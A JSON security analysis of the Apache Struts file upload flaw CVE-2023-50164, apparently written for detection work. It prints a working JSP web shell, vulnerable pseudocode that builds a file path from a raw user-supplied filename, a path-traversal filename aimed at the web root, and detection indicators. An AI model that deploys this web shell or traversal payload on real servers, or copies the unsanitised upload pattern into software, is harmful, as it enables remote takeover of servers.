@@ -1,0 +1,105 @@
+{
+  "package_info": {
+    "package_name": "Apache Struts",
+    "package_manager": "Maven (Java ecosystem)",
+    "package_versions": "Struts 2.0.0 through 2.5.32 and 6.0.0 through 6.3.0.1 (as per CVE-2023-50164, not explicitly stated in the report but inferred from public advisories)",
+    "why_malicious": "The affected versions of Apache Struts contain a critical vulnerability in the file upload mechanism (specifically in the MultiPartRequestWrapper class) that allows attackers to manipulate file upload parameters. This enables path traversal, allowing arbitrary files to be written or overwritten on the server, which can result in remote code execution, unauthorized data access, and full system compromise."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (during file upload handling, when a user submits a file upload request)",
+        "file_location": "Java class responsible for file uploads, such as MultiPartRequestWrapper or the associated controller/action handling file uploads",
+        "required_permissions": [
+          "filesystem write access to upload and target directories",
+          "potentially network access if remote code execution is achieved"
+        ]
+      },
+      "code_snippet": "// Pseudocode representing the vulnerable logic\nString fileName = request.getParameter(\"filename\");\nFile uploadedFile = new File(uploadDir, fileName);\ninputStream.transferTo(uploadedFile);",
+      "code_language": "java",
+      "code_behavior": "Handles file uploads by directly using the user-supplied filename parameter to construct the destination file path, without sanitizing or validating the input. This allows attackers to supply path traversal sequences and write files outside the intended upload directory.",
+      "malice_analysis": {
+        "why_suspicious": "Directly incorporating user-supplied input into file system paths without validation enables path traversal attacks. Attackers can exploit this to write files to arbitrary locations, including web roots or configuration directories.",
+        "violated_expectations": "Secure file upload handlers must sanitize and validate all user-supplied file paths to prevent directory traversal and restrict uploads to a designated safe directory. The actual behavior fails to enforce these controls, allowing arbitrary file overwrite or creation.",
+        "similar_legitimate_use": "Legitimate file upload handlers may use user-supplied filenames, but only after strict sanitization (e.g., removing path separators, restricting to a whitelist of allowed characters, and enforcing upload directory boundaries).",
+        "key_indicators": [
+          "Absence of path sanitization or validation on user-supplied filename",
+          "Direct use of user input in file system operations (e.g., new File(uploadDir, fileName))",
+          "Potential for '../' or absolute path injection in filename parameter",
+          "Ability to write files outside the intended upload directory"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (after file upload, when attacker accesses the uploaded file via HTTP request)",
+        "file_location": "Web-accessible directory or any location determined by attacker via path traversal (e.g., webapps/ROOT/)",
+        "required_permissions": [
+          "filesystem write access to web-accessible directories",
+          "web server execution context to execute uploaded scripts"
+        ]
+      },
+      "code_snippet": "// Example of attacker-uploaded web shell (JSP)\n<% if (request.getParameter(\"cmd\") != null) {\n    String cmd = request.getParameter(\"cmd\");\n    Process p = Runtime.getRuntime().exec(cmd);\n    java.io.InputStream in = p.getInputStream();\n    int a = -1;\n    while((a=in.read())!=-1) out.print((char)a);\n} %>",
+      "code_language": "jsp",
+      "code_behavior": "Implements a web shell that executes arbitrary system commands received via the 'cmd' HTTP parameter and returns the output in the HTTP response, enabling remote code execution on the server.",
+      "malice_analysis": {
+        "why_suspicious": "The code executes system commands based on user input and returns the output to the client, which is a hallmark of a web shell and a severe security risk.",
+        "violated_expectations": "Uploaded files should not be executable scripts, and web applications must never allow arbitrary command execution via HTTP parameters. This behavior directly violates secure coding practices.",
+        "similar_legitimate_use": "There is no legitimate use for this pattern in production web applications. Command execution based on user input is only found in malicious or testing/debugging code, never in production.",
+        "key_indicators": [
+          "Use of Runtime.getRuntime().exec() with user-controlled input",
+          "Presence of executable JSP code in upload or web root directories",
+          "Echoing command output directly to HTTP response",
+          "HTTP parameter (e.g., 'cmd') used to control system command execution"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker crafts a file upload request with a malicious filename parameter containing path traversal sequences (e.g., '../../webapps/ROOT/shell.jsp') to target a web-accessible directory.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Malicious file (such as a web shell) is written to an arbitrary, attacker-controlled location on the server."
+    },
+    {
+      "step": 2,
+      "action": "Attacker uploads a web shell or malicious script to a web-accessible directory using the vulnerable file upload handler, bypassing intended upload restrictions.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Malicious code is now present in a location accessible via HTTP requests, enabling further exploitation."
+    },
+    {
+      "step": 3,
+      "action": "Attacker sends HTTP requests to the uploaded web shell, passing system commands via parameters (e.g., 'cmd'), which are executed on the server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Remote code execution is achieved, allowing the attacker to execute arbitrary commands and potentially fully compromise the system."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "File uploads resulting in files being written outside the intended upload directory, especially into web-accessible or configuration directories",
+      "Detection of executable scripts (e.g., .jsp, .php) appearing in web root or other sensitive directories following file upload activity",
+      "HTTP requests to newly uploaded files with parameters indicative of command execution (e.g., 'cmd=')"
+    ],
+    "file_indicators": [
+      "Unexpected .jsp, .php, or .exe files appearing in web root or configuration directories after file uploads",
+      "Filenames containing '../' or absolute paths in upload logs or file system events",
+      "Modified or overwritten configuration files (e.g., web.xml) following file upload operations"
+    ],
+    "network_indicators": [
+      "HTTP requests with suspicious file upload parameters (e.g., filename=../../...) targeting file upload endpoints",
+      "HTTP requests to uploaded web shells with command parameters (e.g., /shell.jsp?cmd=whoami)",
+      "Unusual outbound connections initiated by the web server process, potentially as a result of executed commands"
+    ],
+    "how_to_detect": "Monitor file upload endpoints for path traversal patterns in filename parameters (e.g., '../', absolute paths). Audit file system changes for unexpected files, especially executable scripts, in web-accessible or sensitive directories. Correlate file creation or modification events with upload activity and alert on deviations from expected upload directories. Analyze HTTP access logs for requests to new .jsp/.php files with command parameters. Deploy web application firewalls (WAF) to block file uploads containing suspicious paths or file types. Regularly review upload logs and file system events for evidence of path traversal or unauthorized file placement."
+  }
+}
